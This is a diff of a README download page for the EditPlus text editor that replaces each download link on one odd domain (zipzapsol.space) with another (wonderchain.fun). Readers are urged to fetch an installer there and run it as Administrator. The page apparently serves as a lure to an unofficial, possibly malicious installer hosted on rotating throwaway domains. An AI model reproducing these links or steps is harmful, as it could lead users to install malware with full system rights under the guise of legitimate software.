@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **EditPlus** for Windows.
 
 <p align="center">
-  <a href="https://editplus.zipzapsol.space/">
+  <a href="https://editplus.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-EditPlus-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download EditPlus">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[editplus.zipzapsol.space](https://editplus.zipzapsol.space/)** |
-| **Full URL** | `https://editplus.zipzapsol.space/` |
+| **Direct link** | **[editplus.wonderchain.fun](https://editplus.wonderchain.fun/)** |
+| **Full URL** | `https://editplus.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — editplus.zipzapsol.space](https://editplus.zipzapsol.space/)** (link above)
+1. Click **[Download — editplus.wonderchain.fun](https://editplus.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://editplus.zipzapsol.space/"><strong>⬇ Download EditPlus now</strong></a></p>
+<p align="center"><a href="https://editplus.wonderchain.fun/"><strong>⬇ Download EditPlus now</strong></a></p>
 
 ---
 
